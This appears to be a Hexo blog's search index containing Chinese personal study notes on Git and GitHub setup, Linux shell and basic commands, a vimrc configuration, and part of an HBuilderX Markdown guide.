<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Git &amp; Github</title>
    <url>/2020/05/03/Git/</url>
    <content><![CDATA[<h1 id="Git-amp-Github"><a href="#Git-amp-Github" class="headerlink" title="Git &amp; Github"></a>Git &amp; Github</h1><ul>
<li><p>Git 初始化</p>
<pre><code># 设置github昵称
git config --global user.name &#39;mxrmiss&#39;
# 设置github邮箱
git config --global user.email &#39;heroli520@outlook.com&#39;</code></pre></li>
<li><p>git status 无法显示中文</p>
<pre><code>git config --global core.quotepath false</code></pre><span id="more"></span>
</li>
<li><p>git 无法推送新文件到github仓库原因</p>
<ol>
<li>可能仓库内已经有东西了，而且使用的推送命令不对</li>
<li>或是原来的仓库内的东西是通过网页进行上传的， 而不还是通过命令行进行上传的</li>
<li>强制使用命令  “git commit 文件 +mster” 可能会使原仓库内的东西丢失</li>
</ol>
</li>
<li><p>查看git简单配置</p>
<pre><code>git config --list</code></pre></li>
<li><p>是git无密向github传输文件</p>
<ol>
<li>终端输入ssh-keygen, 之后不断按回车</li>
<li>会产生一对公密和私密，存储在家目录下的 .ssh 目录中</li>
<li>cat ～/.ssh/id_rsa.pub ，复制输出的公密内容至 github个人主页setting中的ssh中，并保存</li>
<li>ssh -T <a href="mailto:git@github.com">git@github.com</a> #打开git bash输入此命令，显示successful表示成功</li>
<li>以后clone仓库地址时就可以直接使用</li>
</ol>
</li>
<li><p>向仓库更新文件基本命令</p>
</li>
</ul>
<pre><code>git status
git add *
git commit -m &quot;内容描述&quot;
git push</code></pre><ul>
<li><p>无法读取远程仓库</p>
<p>删除blog文件夹下的隐藏文件 .deploy_git</p>
</li>
</ul>
<pre><code>fatal: 无法读取远程仓库。

请确认您有正确的访问权限并且仓库存在。</code></pre>]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux高级</title>
    <url>/2021/03/24/Linux%20%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="Linux-高级程序设计"><a href="#Linux-高级程序设计" class="headerlink" title="Linux 高级程序设计"></a>Linux 高级程序设计</h1><ul>
<li><a href="https://www.bilibili.com/video/BV1Mk4y1z7Tw/?p=4">笔记参考视频链接</a></li>
<li>注：此笔记参考了视频教程中的内容，以及部分资料，仅供学习参考</li>
</ul>
<h2 id="一、shell编程"><a href="#一、shell编程" class="headerlink" title="一、shell编程"></a>一、shell编程</h2><h3 id="1-1概述"><a href="#1-1概述" class="headerlink" title="1.1概述"></a>1.1概述</h3><h4 id="1-1-1-shell作为应用程序"><a href="#1-1-1-shell作为应用程序" class="headerlink" title="1.1.1 shell作为应用程序"></a>1.1.1 shell作为应用程序</h4><span id="more"></span>

<ul>
<li>交互式地解释、执行用户输入的命令,将用户的操作翻译成机器可以识别的语言,完成相应功能称之为shell命令解析器 ，shell是用户和Linux内核之间的接口程序。 用户在提示符下输入的命令都由shell先解释，然后传给Linux核心。</li>
<li>它调用了系统核心的大部分功能来执行程序、并以并行的方式协调各个程序的运行 。Linux系统中提供了好几种不同的shell命令解释器,如sh、ash、bash等。一般默认使用bash作为默认的解释器。我们后面编写的shell脚本,都是由上述shell命令解释器解释执行的。</li>
</ul>
<p><img "" class="lazyload placeholder" data-original="/home/blacksheep/.config/Typora/typora-user-images/image-20200607170442735.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20200607170442735"></p>
<p><img "" class="lazyload placeholder" data-original="/home/blacksheep/.config/Typora/typora-user-images/image-20200607170727415.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20200607170727415"></p>
<h4 id="1-1-2-shell作为程序设计语言"><a href="#1-1-2-shell作为程序设计语言" class="headerlink" title="1.1.2 shell作为程序设计语言"></a>1.1.2 shell作为程序设计语言</h4><ul>
<li>简称shell脚本，用任意文本编译器添加内容，再授予权限即可使用，与一些编程语言相类似</li>
<li>/etc/profile 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行,系统的公共环境变量在这里设置 ，开始自启动的程序,一般也在这里设置</li>
<li>~/.bashrc用户自己的家目录中的.bashrc 登录时会自动调用,打开任意终端时也会自动调用。这个文件一般设置与个人用户有关的环境变量,如交叉编译器的路径等等</li>
<li>用户编写,需要手动调用的 例如我们上面编写的脚本都属于此类 无论是系统调用的还是需要我们自己调用的,其语法规则都一样</li>
</ul>
<h3 id="1-2-shell语法"><a href="#1-2-shell语法" class="headerlink" title="1.2 shell语法"></a>1.2 shell语法</h3><h4 id="1-2-1-脚本的定义与执行"><a href="#1-2-1-脚本的定义与执行" class="headerlink" title="1.2.1 脚本的定义与执行"></a>1.2.1 脚本的定义与执行</h4><ol>
<li>定义以开头:#!/bin/sh #!用来声明脚本由什么shell解释,否则使用默认shell</li>
<li>单个”#”号代表注释当前行</li>
<li>执行: chmod + x test.sh ./test.sh 增加可执行权限后执行 </li>
<li>bash test.sh 直接指定使用bash解释test.sh </li>
<li>.  test.sh(source test.sh) 使用当前shell读取解释test.sh</li>
<li>脚本的书写不能包含空格</li>
</ol>
<h4 id="1-2-2-变量"><a href="#1-2-2-变量" class="headerlink" title="1.2.2 变量"></a>1.2.2 变量</h4><ol>
<li><p>自定义变量<br>定义变量 变量名=变量值 如:num=10 </p>
</li>
<li><p>引用变量 $变量名<br> 如:i=$num 把变量num的值付给变量i </p>
</li>
<li><p>显示变量 使用echo命令可以显示单个变量取值 echo<br> $num </p>
</li>
<li><p>清除变量 使用unset命令清除变量 unset varname</p>
</li>
<li><p>变量的其它用法: read string 从键盘输入一个字符串付给变量</p>
</li>
<li><p>string readonly var=100 定义一个只读变量,只能在定义时初始化,以后不能改变,不能被清除。 </p>
</li>
<li><p>export var=300 使用export说明的变量,会被导出为环境变量,其它shell均可使用 注意:此时必须使用source 2_var.sh才可以生效</p>
</li>
<li><p>注意事项:</p>
<ol>
<li><p>变量名只能包含英文字母下划线,不能以数字开头 1_num=10 错误 num_1=20 正确</p>
</li>
<li><p>等号两边不能直接接空格符,若变量中本身就包含了空格,则整个字符串都要用双引号、或单引号括起来;双引号内的特殊字符可以保有变量特性,但是单引号内的特殊字符则仅为一般字符。name=aa bb //错误 name=”aa bb” //正确 echo “$name is me” //输出:aa bb is me echo’$name is me’ //输出:$name is me 例2: 2_var.sh</p>
</li>
</ol>
</li>
</ol>
<h4 id="1-2-3-环境变量（类似全局变量）"><a href="#1-2-3-环境变量（类似全局变量）" class="headerlink" title="1.2.3 环境变量（类似全局变量）"></a>1.2.3 环境变量（类似全局变量）</h4><ol>
<li>shell在开始执行时就已经定义了一些和系统的工作环境有关的变量，我们可以在shell中直接使用$name引用</li>
<li>定义：一般在~/bashrc或/etc/profile文件中（系统自动调用的脚本）使用export设置，允许用户后来修改</li>
<li>设置环境变量：</li>
</ol>
<ul>
<li>临时设置：使用export命令</li>
<li>永久设置：需要在配置文件（~/bashrc或/etc/profile文件）中进行设置即可，设置完毕后需要通过source命令配置文件立即生效</li>
</ul>
<ol start="4">
<li>预设变量：</li>
</ol>
<pre><code>$#:传给shell脚本参数的数量 
$*:传给shell脚本参数的内容 $1、$2、$3、...、$9:运行脚本时传递给其的参数,用空格隔开
$?:命令执行后返回的状态 &quot;$?&quot;用于检查上一个命令执行是否正确(在Linux中,命令退出状态为0表示该命令正确执行,任何非0值表示命令出错)。
$0:当前执行的进程名 $$:当前进程的进程号 
&quot;$$&quot;变量最常见的用途是用作临时文件的名字以保证临时文件不会重复
</code></pre><ol start="5">
<li>符号的特殊用法：</li>
</ol>
<ul>
<li>双引号里的变量会被引用解释</li>
<li>单引号里的字符会被直接当成字符串使用</li>
<li>反引号：获取一个shell命令的输出结果，或者将该结果赋予一个变量再去使用，单引号的使用必须在双引号内才会被解释，不能放在单引号内</li>
<li>转义符使用时必须在echo后面加-e</li>
</ul>
<pre><code>echo -e &quot;this \n is \n an apple&quot;</code></pre><ul>
<li>小括号：里面的内容由子shell完成，不影响不影响当前shell中的变量</li>
<li>大括号：在当前shell中执行会影响当前变量</li>
</ul>
<h4 id="1-2-4-条件测试语句"><a href="#1-2-4-条件测试语句" class="headerlink" title="1.2.4 条件测试语句"></a>1.2.4 条件测试语句</h4><ol>
<li><p>为什么要测试？相当于代码中的局部调试</p>
</li>
<li><p>test命令：用于测试字符串、文件状态和数字</p>
</li>
<li><p>test命令的俩种形式：</p>
<p>​            test或 [ condition ]  //方括号中的条件俩边必须要加空格</p>
</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux基础</title>
    <url>/2020/05/03/Linux%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p><a href="https://book.apeland.cn/details/189/">本笔记的友情链接</a></p>
<h2 id="常用目录介绍"><a href="#常用目录介绍" class="headerlink" title="常用目录介绍"></a>常用目录介绍</h2><ol>
<li>boot    存放启动文件</li>
<li>dev     存放设备文件</li>
<li>etc     存放配置文件</li>
<li>home    普通用户家目录，以/home/$username的方式存放</li>
<li>media   移动存储自动挂载目录,以 /media/$device_name的方式来存放</li>
<li>mnt     手动挂载目录</li>
<li>opt     三方软件安装目录</li>
<li>proc    内存系统文件</li>
<li>root    管理员家目录</li>
<li>run     里面的东西是系统运行时需要的, 不能随便删除. 但是重启的时候应该抛弃. 下次系统运行时重新生成</li>
<li>srv     服务相关数据</li>
<li>sys     系统文件</li>
<li>tmp     临时文件夹</li>
<li>usr     存放库文件、文档、命令、用户数据等</li>
<li>var     日志存放lib     库文件<span id="more"></span></li>
</ol>
<ul>
<li>-echo相当于python中的print，即输出、打印的意思</li>
</ul>
<h2 id="linux基本命令"><a href="#linux基本命令" class="headerlink" title="linux基本命令"></a>linux基本命令</h2><h3 id="命令-命令选项-参数"><a href="#命令-命令选项-参数" class="headerlink" title="命令[命令选项][参数]"></a>命令[命令选项][参数]</h3><p>​    {必选项}， [可选项]</p>
<p>1）清屏命令：clear      快捷键  ctrl+l<br>2）帮助命令：man<br>3）进入文件夹命令: cd  【change dir，cd理解为改变目录的意思】<br>4）列出当前目录内容命令：ls   [-a -l -d ] 【list】<br>5）显示主机名：hostname<br>6）显示日期时间：date [-s %F]<br>7）显示日历：cal<br>8）计算器：bc<br>9）重启命令：reboot     shutdown -r      init 6<br>10）注销命令：logout<br>11）关机命令：halt      shutdown -h         init 0<br>12) 显示当前操作系统和机器的信息: uname<br>13) 显示当前路径: pwd 【定位自己的位置】</p>
<p>-多个命令选项可以用一个 — 拼凑在一起，若命令产生了冲突，则以排最后的为主<br>-命令选项写全称时，前面加 — —</p>
<ul>
<li><p>从命令行启动图形界面的默认图片查看器</p>
<p>​    运行命令：xdg-open filename.png</p>
</li>
<li><p>在命令行打开一个图片:</p>
<ol>
<li><p>apt install fim</p>
</li>
<li><p>fim filename.png</p>
<ul>
<li><p>fim是fbi的升级版</p>
<p><a href="http://www.itpro.net.cn/2019/12/linux">有关于fim的操作链接</a></p>
</li>
</ul>
</li>
</ol>
</li>
<li><p>apt 与apt-get 的区别：apt-get 是 apt 的子集</p>
</li>
<li><p>更新安装包：apt upgrade</p>
</li>
</ul>
<h3 id="安装内核头文件"><a href="#安装内核头文件" class="headerlink" title="安装内核头文件"></a>安装内核头文件</h3><ul>
<li>输入命令：apt-get install linux-headers-$(uname -r)或者直接敲apt-get install linux-headers-在这时候你按键盘上的tab键，找你本系统的头文件安装即可</li>
</ul>
<h3 id="安装照相机"><a href="#安装照相机" class="headerlink" title="安装照相机"></a>安装照相机</h3><pre><code>sudo apt install cheese</code></pre><h3 id="u盘修改只读模式"><a href="#u盘修改只读模式" class="headerlink" title="u盘修改只读模式"></a>u盘修改只读模式</h3><ol>
<li>查看U盘分区</li>
</ol>
<pre><code>sudo fdisk -l</code></pre><ol start="2">
<li>查看U盘的挂载点</li>
</ol>
<pre><code>df U盘分区</code></pre><ol start="3">
<li>卸载原挂载的U盘</li>
<li>修复U盘的文件管理系统</li>
</ol>
<pre><code>sudo dosfsck -v -a [U盘分区]</code></pre><ol start="5">
<li>重新挂载</li>
</ol>
<h3 id="蓝牙"><a href="#蓝牙" class="headerlink" title="蓝牙"></a>蓝牙</h3><pre><code>sudo service bluetooth start  //打开蓝牙配适器
sudo service bluetooth stop   //关闭蓝牙配适器</code></pre><h3 id="关闭进程"><a href="#关闭进程" class="headerlink" title="关闭进程"></a>关闭进程</h3><ul>
<li>有时候应用被我们1关闭了，可它还在后台运行，这就要求我们手动关闭进程</li>
<li>kill -9 进程IP    //可利用htop命令查看进程IP</li>
<li>若没有htop，可下载</li>
</ul>
<pre><code>sudo apt install htop</code></pre><h3 id="卸载-IntelliJ-IDEA-类似卸载可参考"><a href="#卸载-IntelliJ-IDEA-类似卸载可参考" class="headerlink" title="卸载 IntelliJ IDEA(类似卸载可参考)"></a>卸载 IntelliJ IDEA(类似卸载可参考)</h3><ol>
<li>寻找Intellij IDEA 里面是否有uninstall.sh文件，有就能直接卸载</li>
<li>若没有，则在里面找说明文档，找到相关配置文件所在的目录，将IntelliJ IDEA 文件夹及其相关配置文件一起删除</li>
<li>可能会存在开始菜单栏里依然有图标显示的问题，</li>
</ol>
<pre><code>cd ~/.local/share/applications</code></pre><ol start="4">
<li>之后在applications文件夹里找到相对应的配置文件删除即可</li>
</ol>
<h3 id="linux换源"><a href="#linux换源" class="headerlink" title="linux换源"></a>linux换源</h3><ul>
<li>进入目录  /etc/apt/</li>
<li>sudo vim source.list</li>
<li>上网寻找适合自己的源</li>
</ul>
<h3 id="关于Anaconda的安装"><a href="#关于Anaconda的安装" class="headerlink" title="关于Anaconda的安装"></a>关于Anaconda的安装</h3><ul>
<li><p>在清华镜像站下载Anaconda</p>
</li>
<li><p>安装后修改环境变量</p>
<ul>
<li><p>sudo vim /etc/profile</p>
</li>
<li><p>向里面写入  export PATH=$PATH:/home/balacksheep/anaconda3/bin:$PATH</p>
<pre><code>                       %%blacksheep为用户名，应选择自己的路                            径配置环境变量</code></pre></li>
</ul>
</li>
<li><p>安装后命令行使用时前面有base，代表安装成功，不需要去掉base，对使用无影响</p>
</li>
<li><p>更换anaconda的源，以清华源举例：</p>
<ul>
<li><p>sudo vim ~/.condarc</p>
</li>
<li><p>向里面写入：</p>
</li>
</ul>
</li>
</ul>
<pre><code>```
channels:
https://mirrors.ustc.edu.cn/anaconda/pkgs/main/
https://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/
https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/
defaults
show_channel_urls: true
```</code></pre><h3 id="关于qq的安装问题"><a href="#关于qq的安装问题" class="headerlink" title="关于qq的安装问题"></a>关于qq的安装问题</h3><ul>
<li>在kali系统中，输入wine，系统会自动提示你wine未安装，此时按照提示给的步骤来就行了</li>
<li>关于字体问题：qq安装好了后会发现有些字体变成了乱码，此时可以安装一些字体来解决</li>
</ul>
<pre><code>apt-get install xfonts-intl-chinese
apt-get install ttf-wqy-microhei</code></pre><ul>
<li>关于QQ用wine装好后找不到的问题<ul>
<li>wine 默认被配置成home文件下的隐藏文件，cd .wine即可调出</li>
<li>输入~/.wine/drive_c/Program Files (x86)/Tencent/QQ/Bin</li>
<li>你会发现里面优QQ.exe文件，输入wine QQ 或wine QQ.exe即可调出QQ程序</li>
<li>为了方便，可以把QQ/Bin 放到home文件下</li>
</ul>
</li>
</ul>
<h3 id="关于输入法的问题"><a href="#关于输入法的问题" class="headerlink" title="关于输入法的问题"></a>关于输入法的问题</h3><ul>
<li>搜狗输入法兼容性不咋地，反正安装了很多遍都不行</li>
<li>谷歌输入法可以用，基于小企鹅输入法使用，但是也不咋地，毕竟是外国人做的中国输入法，不怎么走心</li>
<li>推荐使用百度输入法，基于小企鹅输入法，首先上官网搜索压缩包，解压后找到安装包文件进行安装，最重要一点是安装后关机重启，重启后系统会自动帮助你进行百度输入法的一些个性化的设置，接着到输入法设置中应用百度输入法就OK了</li>
</ul>
<h3 id="wps字体问题"><a href="#wps字体问题" class="headerlink" title="wps字体问题"></a>wps字体问题</h3><ul>
<li>使用wps for linux2019 时可能有些中文字体会出现乱码，原因是系统缺失相应的字体</li>
<li>将Windows系统下的Windows目录中的Fonts文件夹复制到Linux系统中的/usr/share/fonts/目录下，再执行以下命令</li>
</ul>
<pre><code>sudo fc-cache -fv     //识别字体库

fc-list :lang=zh-cn | sort    //确认是否安装</code></pre><h3 id="关于vmware-虚拟机安装"><a href="#关于vmware-虚拟机安装" class="headerlink" title="关于vmware 虚拟机安装"></a>关于vmware 虚拟机安装</h3><ol>
<li>官网下载虚拟机最新版本</li>
<li>chmod -x 下载的文件</li>
<li>sudo bash 下载的文件</li>
<li>之后就可以在电脑中找到虚拟机，并进行下一步的安装操作</li>
</ol>
<h3 id="linux-vmware升级问题"><a href="#linux-vmware升级问题" class="headerlink" title="linux-vmware升级问题"></a>linux-vmware升级问题</h3><p><a href="https://www.cnblogs.com/wjshan0808/p/4110495.html">解决 linux升级 导致VMware启动出现”before you can run vmware workstation, serveral modules must be complied and loaded into the runing kernel” 而无法卸载</a></p>
<pre><code># vmware-uninstall 
You have gotten this message because you are either downgrading VMware
Workstation, Player, or VIX, or because you attempted to run either
vmware-uninstall or vmware-uninstall-vix.

If you are downgrading, please uninstall all newer versions first, then
install again.

The vmware-uninstall* scripts have been deprecated.  Instead, please use
the vmware-installer.

Long form:
      vmware-installer --uninstall-product PRODUCT
Short form:
      vmware-installer -u PRODUCT

Where PRODUCT is one of vmware-workstation, vmware-player, or vmware-vix.

For a list of which products are installed, you may run:
      vmware-installer --list-products
or:
      vmware-installer -l


# vmware-installer -l
Product Name         Product Version     
==================== ====================
vmware-workstation   10.0.4.2249910      
# vmware-installer -u vmware-workstation</code></pre><h3 id="man-中文手册下载"><a href="#man-中文手册下载" class="headerlink" title="man 中文手册下载"></a>man 中文手册下载</h3><ol>
<li>Debian / Ubuntu安装</li>
</ol>
<pre><code>sudo apt update
sudo apt install manpages-zh</code></pre><ol start="2">
<li>Arch Linux:</li>
</ol>
<pre><code>pacman -Syu
pacman -S man-pages-zh_cn man-pages-zh_tw</code></pre><ol start="3">
<li>Red Hat / CentOS:</li>
</ol>
<pre><code>yum update
yum install man-pages-zh-CN</code></pre><ol start="4">
<li>Fedora:</li>
</ol>
<pre><code>dnf update
dnf install man-pages-zh-CN</code></pre><h3 id="kali内核更新安装"><a href="#kali内核更新安装" class="headerlink" title="kali内核更新安装"></a>kali内核更新安装</h3><ol>
<li>查看内核版本</li>
</ol>
<pre><code>uname -r</code></pre><ol start="2">
<li>检查linux是否安装对应的头文件</li>
</ol>
<pre><code>sudo apt-cache search linux-headers</code></pre><ol start="3">
<li>安装更新头文件</li>
</ol>
<pre><code>sudo apt install linux-headers-$(uname -r)</code></pre><ol start="4">
<li>内核头文件检测是否安装</li>
</ol>
<pre><code>sudo dpkg-query -s linux-headers-`uname -r`</code></pre><h3 id="vim命令"><a href="#vim命令" class="headerlink" title="vim命令"></a>vim命令</h3><ol>
<li>:set number 显示行号</li>
<li>:set 取消行号</li>
<li>xG:跳转到指定的第x行，G移动到文件末尾行</li>
<li>dd ：剪切一行， yy：复制一行</li>
<li>D：剪切一个字符，y：复制一个字符</li>
<li>p：粘贴</li>
<li>dxw：删除光标右边x个字符</li>
<li>dxh：删除光标左边x个字符</li>
<li>:x 删除一个字符</li>
<li>/string :查找字符 n:向上查找，N：向下查找</li>
<li>:范围 s/oldword/newword/g  字符替换 %s全文查找，g为global，全局替换</li>
</ol>
<ul>
<li>vim规则总结</li>
</ul>
<p>（1）一般是操作字符+被操作的量</p>
<p>（2）$ 为结尾， 0 为开头</p>
<ul>
<li>vim简单配置：</li>
</ul>
<pre><code class="c">  &quot;===================
  &quot;适合自己用的vimrc配置文件
  &quot;===================

  &quot;设置编码
  set fileencodings=utf-8,ucs-bom,gb18030,gbk,gb2312,cp936
  set termencoding=utf-8
  set encoding=utf-8

  &quot;保存.vimrc文件时自动重启加载，即让此文件立即生效
  autocmd BufWritePost $MYVIMRC source $MYVIMRC

  &quot;语法高亮
  syntax on

  &quot;设置ruler会在右下角显示光标所在的行号和列号,不方便查看,改成设置状态栏显示内容
  &quot;set ruler

  &quot;设置状态行显示的内容. %F: 显示当前文件的完整路径. %r: 如果readonly,会显示[RO]
  &quot;%B: 显示光标下字符的编码值,十六进制. %l:光标所在的行号. %v:光标所在的虚拟列号.
  &quot;%P: 显示当前内容在整个文件中的百分比. %H和%M是strftime()函数的参数,获取时间.
  set statusline=%F%r\ [HEX=%B][%l,%v,%P]\ %&#123;strftime(\&quot;%H:%M\&quot;)&#125;

  &quot;显示行号
  set nu &quot;等同于 set number

  &quot;突出显示当前行
  set cursorline &quot;等同于 set cul

  &quot;突出显示当前列
  set cursorcolumn &quot;等同于 set cuc

  &quot;共享剪贴板  
  set clipboard+=unnamed 

  &quot;从不备份  
  set nobackup

  &quot;自动保存
  set autowrite

  &quot;隐藏工具栏
  &quot;set guioptions-=T
  &quot;隐藏菜单栏
  &quot;set guioptions-=m

  &quot;高亮显示所有搜索到的内容.后面用map映射快捷键来方便关闭当前搜索的高亮.
  &quot;set hlsearch

  &quot;光标立刻跳转到搜索到内容
  &quot;set incsearch

  &quot;搜索到最后匹配的位置后,再次搜索不回到第一个匹配处
  &quot;set nowrapscan

  &quot;去掉输入错误时的提示声音
  set noeb

  &quot; 默认按下Esc后,需要等待1秒才生效,设置Esc超时时间为100ms,尽快生效
  set ttimeout
  set ttimeoutlen=100

  &quot;在处理未保存或只读文件的时候，弹出确认
  set confirm

  &quot;让Backspace键可以往前删除字符.
  &quot;Debian系统自带的vim版本会加载一个debian.vim文件,默认已经设置这一项,
  &quot;可以正常使用Backspace键.如果使用自己编译的vim版本,并自行配置.vimrc文件,
  &quot;可能就没有设置这一项,导致Backspace键用不了,或者时灵时不灵.所以主动配置.
  &quot;使回格键（backspace）正常处理indent, eol, start等
  set backspace=indent,eol,start

  &quot;允许backspace和光标键跨越行边界
  &quot;set whichwrap+=&lt;,&gt;,h,l

  &quot;去掉有关vi一致性模式,避免操作习惯上的局限.
  set nocompatible

  &quot;FIXME 在MS-DOS控制台打开vim时,控制台使用鼠标右键来复制粘贴,设置
  &quot;全鼠标模式,鼠标右键被映射为visual mode,不能用来复制粘贴,不方便.
  &quot;但是如果不设置鼠标模式,会无法使用鼠标滚轮来滚动界面.经过验证,发现
  &quot;可以设成普通模式mouse=n来使用鼠标滚轮,也能使用鼠标右键复制粘贴.
  &quot; mouse=c/mouse=i模式都不能用鼠标滚轮. Linux下还是要设成 mouse=a
  set mouse=n
  &quot;set selection=exclusive
  &quot;set selectmode=mouse,key

  &quot;高亮显示括号匹配
  set showmatch

  &quot;设置Tab长度为4空格
  set tabstop=4
  &quot;设置自动缩进长度为4空格
  set shiftwidth=4
  &quot;自动缩进,这个导致从外面拷贝多行以空格开头的内容时,会有多的缩进,先不设置
  &quot;set autoindent
  &quot;不要用空格代替制表符
  set noexpandtab
  &quot;输入tab制表符时，自动替换成空格
  &quot;set expandtab
  &quot;设置softtabstop有一个好处是可以用Backspace键来一次删除4个空格.
  &quot;softtabstop的值为负数,会使用shiftwidth的值,两者保持一致,方便统一缩进.
  &quot;set softtabstop=4


  &quot;显示空格和tab键
  set listchars=tab:&gt;-,trail:-

  &quot;1=启动显示状态行, 2=总是显示状态行.设置总是显示状态行,方便看到当前文件名
  set laststatus=2

  &quot;自动补全
  :inoremap ( ()&lt;ESC&gt;i
  :inoremap ) &lt;c-r&gt;=ClosePair(&#39;)&#39;)&lt;CR&gt;
  :inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O
  :inoremap &#125; &lt;c-r&gt;=ClosePair(&#39;&#125;&#39;)&lt;CR&gt;
  :inoremap [ []&lt;ESC&gt;i
  :inoremap ] &lt;c-r&gt;=ClosePair(&#39;]&#39;)&lt;CR&gt;
  :inoremap &quot; &quot;&quot;&lt;ESC&gt;i
  :inoremap &#39; &#39;&#39;&lt;ESC&gt;i
  function! ClosePair(char)
      if getline(&#39;.&#39;)[col(&#39;.&#39;) - 1] == a:char
          return &quot;\&lt;Right&gt;&quot;
      else
          return a:char
      endif
  endfunction 
  &quot;打开文件类型检测,并载入文件类型插件,为特定文件类型载入相关缩进文
  filetype plugin indent on
  &quot; 设置自动补全的选项. longest表示只自动补全最大匹配的部分,剩余部分通过
  &quot; CTRL-P/CTRL-N来选择匹配项进行补全. menu表示弹出可补全的内容列表.
  &quot; 如果有多个匹配,longest选项不会自动选中并完整补全,要多按一次CTRL-P,比较
  &quot; 麻烦,不做设置,保持默认设置,vim默认没有设置longest.
  &quot;set completeopt=longest,menu &quot;启用这句才会开启自动补全


  &quot;=============显示中文帮助
  if version &gt;= 603
      set helplang=cn
      set encoding=utf-8
  endif

  &quot;=============新建.c,.h,.sh,.java文件，自动插入文件头 
  autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec &quot;:call SetTitle()&quot; 
  &quot;&quot;定义函数SetTitle，自动插入文件头 
  func SetTitle() 
      &quot;如果文件类型为.sh文件 
      if &amp;filetype == &#39;sh&#39; 
          call setline(1,&quot;\############################&quot;) 
          call append(line(&quot;.&quot;), &quot;\# File Name: &quot;.expand(&quot;%&quot;)) 
          call append(line(&quot;.&quot;)+1, &quot;\# Author: Li Ziqiang&quot;) 
          call append(line(&quot;.&quot;)+2, &quot;\# mail: 2296557984@qq.com&quot;) 
          call append(line(&quot;.&quot;)+3, &quot;\# Created Time: &quot;.strftime(&quot;%c&quot;))
          call append(line(&quot;.&quot;)+4, &quot;\############################&quot;) 
          call append(line(&quot;.&quot;)+5, &quot;\#!/bin/bash&quot;) 
          call append(line(&quot;.&quot;)+6, &quot;&quot;) 
      else 
          call setline(1, &quot;/******************************&quot;) 
          call append(line(&quot;.&quot;), &quot;    &gt; File Name: &quot;.expand(&quot;%&quot;)) 
          call append(line(&quot;.&quot;)+1, &quot;    &gt; Author:Li Ziqiang&quot;) 
          call append(line(&quot;.&quot;)+2, &quot;    &gt; Mail: 2296557984@qq.com &quot;) 
          call append(line(&quot;.&quot;)+3, &quot;    &gt; Created Time: &quot;.strftime(&quot;%c&quot;)) 
          call append(line(&quot;.&quot;)+4, &quot; *****************************/&quot;) 
          call append(line(&quot;.&quot;)+5, &quot;&quot;)
      endif

      &quot;新建文件后，自动定位到文件末尾
      autocmd BufNewFile * normal G
  endfunc 
</code></pre>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown_doc_for_HBulider</title>
    <url>/2020/10/21/Markdown_HBuilderX/</url>
    <content><![CDATA[<h1 id="markdown-更简洁、更高效"><a href="#markdown-更简洁、更高效" class="headerlink" title="markdown - 更简洁、更高效"></a>markdown - 更简洁、更高效</h1><p>=================================================</p>
<p>强烈建议开发者认真阅读本文档，掌握md及HBuilderX对md的强大支持。<br><em>窄屏幕下，可按Alt+滚轮横向滚动</em></p>
<span id="more"></span>

<p>很多人只把markdown用于网络文章发表，这糟蹋了markdown。<br>markdown不止是HTML的简化版，更重要的是txt的升级版、word的轻量版、笔记的最佳载体。<br>作为一种简单的格式标记语言，不同于txt的无格式，不同于HTML的复杂标记，也不同于word的鼠标调整样式。markdown通过简单的几个字符键入，就可以快捷的定义文档的样式。<br>比如在行首敲一个“#”，就把这行定义为了1级标题，并且在HBuilderX里有直观完善的着色，这样无需发布为web页面，可直接当word用。<br>掌握markdown，你可以完全抛弃txt和笔记软件的编辑器，并且在大多数场景下替代掉复杂臃肿的word。享受简洁之美、享受效率提升。<br>而HBuilderX，可以被称为最强大的markdown书写工具了。</p>
<p>下面的示例列举了markdown语法及对应的HBuilderX使用技巧：</p>
<p>开始前，可以先按下文档结构图的快捷键Alt+w（Mac是Ctrl+w），浏览本文的大纲。</p>
<h1 id="标题语法"><a href="#标题语法" class="headerlink" title="标题语法"></a>标题语法</h1><p>markdown的标题是行首以#号开头，空格分割的，不同级别的标题，在HX里着色也不同。如下：</p>
<h1 id="标题1"><a href="#标题1" class="headerlink" title="标题1"></a>标题1</h1><h2 id="标题2"><a href="#标题2" class="headerlink" title="标题2"></a>标题2</h2><h3 id="标题3"><a href="#标题3" class="headerlink" title="标题3"></a>标题3</h3><h4 id="标题4"><a href="#标题4" class="headerlink" title="标题4"></a>标题4</h4><h5 id="标题5"><a href="#标题5" class="headerlink" title="标题5"></a>标题5</h5><h6 id="标题6"><a href="#标题6" class="headerlink" title="标题6"></a>标题6</h6><p>标题使用技巧：</p>
<ol>
<li>Emmet快速输入：敲h2+Tab即可生成二级标题【同HTML里的emmet写法，不止标题，HX里所有可对应tag的markdown语法均支持emmet写法】。仅行首生效</li>
<li>智能双击：双击#号可选中整个标题段落</li>
<li>智能回车：行尾回车或行中Ctrl+Enter强制换行后会自动在下一行补#。而连续2次回车后将自动补的#去掉。(体验同word)</li>
<li>回车后再次按Tab可递进一层标题，再按Tab切换列表符</li>
<li>在# 后回车，可上插一个空标题行【同word】，或任意位置按Ctrl+Shift+Enter也可以上插空标题行</li>
<li>折叠：<ul>
<li>点标题前的-号可折叠该标题段落，快捷键是Alt+-（展开折叠是Alt+=）</li>
<li>多层折叠时折叠或展开子节点，快捷键是Alt+Shift+-或=</li>
<li>全文全部折叠或展开，快捷键是Ctrl+Alt+Shift+-或=</li>
<li>折叠其他区域，快捷键是Alt+Shift+o。这对长文档管理非常有用，可以专注于当前章节</li>
<li>可以在菜单-跳转-折叠中随时找到这些功能</li>
